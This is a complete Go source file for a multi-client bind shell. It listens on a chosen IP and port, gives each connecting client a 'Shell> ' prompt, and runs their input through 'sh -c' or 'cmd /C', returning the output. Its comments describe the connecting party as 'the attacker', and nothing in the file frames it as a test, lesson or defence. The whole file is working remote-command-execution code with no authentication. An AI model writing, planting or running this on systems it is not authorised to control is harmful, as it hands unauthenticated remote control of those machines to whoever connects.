package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
)

var (
	connectedClients int
	mu               sync.Mutex
)

func main() {
	// Prompt for LHOST and LPORT
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter LHOST (Listener IP): ")
	lhost, _ := reader.ReadString('\n')
	lhost = strings.TrimSpace(lhost)

	fmt.Print("Enter LPORT (Listener Port): ")
	lport, _ := reader.ReadString('\n')
	lport = strings.TrimSpace(lport)

	// Display listening message
	address := fmt.Sprintf("%s:%s", lhost, lport)
	fmt.Printf("Listening on %s...\n", address)

	// Start listening for incoming connections
	listener, err := net.Listen("tcp", address)
	if err != nil {
		fmt.Println("Error listening:", err)
		return
	}
	defer listener.Close()

	// Handle multiple clients
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}

		// Increment the connected client count
		mu.Lock()
		connectedClients++
		mu.Unlock()

		// Print client connection message
		fmt.Printf("Connection established with %s\n", conn.RemoteAddr().String())
		go handleConnection(conn)
	}
}

// Handle the communication with the connected client
func handleConnection(conn net.Conn) {
	defer conn.Close()

	// Create a buffer for reading commands from the attacker
	reader := bufio.NewReader(conn)

	for {
		// Send a prompt to the attacker
		conn.Write([]byte("Shell> "))

		// Read the command from the attacker
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading from connection:", err)
			break
		}

		// Trim the newline character
		command = strings.TrimSpace(command)

		// Exit condition
		if command == "exit" {
			// Decrement the client count when the connection closes
			mu.Lock()
			connectedClients--
			mu.Unlock()

			fmt.Printf("Connection closed with %s\n", conn.RemoteAddr().String())
			break
		}

		// Execute the command and send back the result
		output := executeCommand(command)
		conn.Write([]byte(output + "\n"))

		// Display the current user count
		mu.Lock()
		fmt.Printf("USERS: %d\n", connectedClients)
		mu.Unlock()
	}
}

// Function to execute the command on the server
func executeCommand(command string) string {
	var cmd *exec.Cmd

	// Use the appropriate shell for the OS
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()

	if err != nil {
		return fmt.Sprintf("Error executing command: %v\n%s", err, string(output))
	}
	return string(output)
}
